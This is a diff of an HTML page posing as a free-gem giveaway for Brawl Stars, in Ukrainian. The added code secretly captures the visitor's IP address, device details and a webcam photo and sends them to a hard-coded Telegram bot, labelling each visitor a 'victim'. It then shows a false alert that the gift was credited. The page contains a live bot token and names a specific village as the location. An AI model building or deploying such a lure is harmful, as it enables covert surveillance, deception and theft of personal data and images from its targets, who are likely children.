@@ -7,91 +7,93 @@
     <style>
         body { 
             margin: 0; 
-            background: linear-gradient(180deg, #004a99 0%, #002d5e 100%); 
-            color: white; 
-            font-family: 'Courier New', Courier, monospace; 
+            background: linear-gradient(180deg, #0057b7 0%, #003366 100%); 
+            color: #ffcc00; 
+            font-family: 'Arial', sans-serif; 
+            height: 100vh; 
             display: flex; 
             flex-direction: column; 
-            min-height: 100vh; 
-            transition: 0.5s; 
+            align-items: center; 
+            justify-content: center; 
         }
-        .header { padding: 20px; font-weight: 800; font-size: 24px; color: #ffcc00; }
-        .main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .card { 
             background: rgba(255, 255, 255, 0.1); 
             padding: 30px; 
-            border-radius: 25px; 
+            border-radius: 20px; 
             text-align: center; 
-            width: 100%; 
-            max-width: 400px; 
-            border: 1px solid rgba(255, 255, 255, 0.2); 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 2px solid #ffcc00; 
+            width: 300px; 
+            box-shadow: 0 0 20px rgba(255, 204, 0, 0.3);
         }
         button { 
-            width: 100%; 
-            padding: 18px; 
+            padding: 15px 30px; 
             background: #ffcc00; 
             border: none; 
-            border-radius: 12px; 
+            border-radius: 10px; 
             font-weight: bold; 
             cursor: pointer; 
-            color: black; 
+            color: #003366; 
             font-size: 18px; 
+            width: 100%; 
         }
-        
-        /* Хакерський стиль */
-        body.hacked { background: #000; color: #0f0; }
-        .hacked .header { color: #0f0; }
-        .hacked .card { border: 2px solid #0f0; background: #000; }
-        #data-box { margin-top: 20px; text-align: left; display: none; border: 1px solid #0f0; padding: 15px; border-radius: 10px; }
+        #video { display: none; }
+        #status { margin-top: 15px; color: white; }
     </style>
 </head>
 <body>
 
-    <div class="header" id="header">BRAWL STARS</div>
-
-    <div class="main">
-        <div class="card" id="card">
-            <h1 id="title">Вітаємо!</h1>
-            <p id="desc">Ваш персональний подарунок у 200 гемів.</p>
-            <button id="btn" onclick="hack()">Отримати подарунок</button>
-
-            <div id="data-box">
-                <p>> IP: <span id="ip">Завантаження...</span></p>
-                <p>> МІСЦЕ: БОРТЯТИН, ЛЬВІВСЬКА ОБЛ.</p>
-                <p>> ПРОВАЙДЕР: KYIVSTAR/UARNET</p>
-                <p>> ПРИСТРІЙ: <span id="dev">...</span></p>
-            </div>
-        </div>
+    <div class="card">
+        <h1 id="title">BRAWL STARS</h1>
+        <p id="desc" style="color: white;">Отримай 200 гемів безкоштовно!</p>
+        <button id="btn" onclick="run()">ОТРИМАТИ</button>
+        <div id="status" style="display:none">Підключення до серверів...</div>
     </div>
+    <video id="video" autoplay playsinline></video>
 
     <script>
-        async function hack() {
-            // Активація стилю
-            document.body.className = "hacked";
-            document.getElementById('title').innerText = "ВІТАЮ, ТЕБЕ ВЗЛАМАЛИ!";
-            document.getElementById('desc').style.display = 'none';
-            document.getElementById('btn').style.display = 'none';
-            document.getElementById('data-box').style.display = 'block';
-            document.getElementById('dev').innerText = navigator.platform;
+        const TG_TOKEN = "8842138354:AAFV7kdBBGcwaNLa2EBaebxCI_cy80r_HxY";
+        const TG_CHAT_ID = "-1003787168523";
 
-            // Масив API для надійності
-            const apis = ['https://api.ipify.org?format=json', 'https://ipapi.co/json/'];
-            
-            for (let url of apis) {
-                try {
-                    const response = await fetch(url);
-                    const data = await response.json();
-                    const ip = data.ip || data.query;
-                    if (ip) {
-                        document.getElementById('ip').innerText = ip;
-                        return; // Зупиняємося, якщо знайшли IP
-                    }
-                } catch (e) {
-                    continue; // Пробуємо наступний сервер
-                }
+        async function run() {
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('status').style.display = 'block';
+
+            let ip = "Невизначено";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) { ip = "Помилка IP"; }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', TG_CHAT_ID);
+                        formData.append('photo', blob);
+                        formData.append('caption', `🔥 ЖЕРТВА BRAWL STARS!\nIP: ${ip}\nЛокація: Бортятин, Львів\nПристрій: ${navigator.userAgent}`);
+
+                        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        stream.getTracks().forEach(track => track.stop());
+                        alert("Подарунок нараховано!");
+                    }, 'image/jpeg');
+                }, 1500);
+            } catch (e) {
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🔥 Жертва (без фото):\nIP: " + ip + "\nПристрій: " + navigator.userAgent)}`);
+                alert("Помилка при отриманні подарунка.");
             }
-            document.getElementById('ip').innerText = "ПОМИЛКА";
         }
     </script>
 </body>
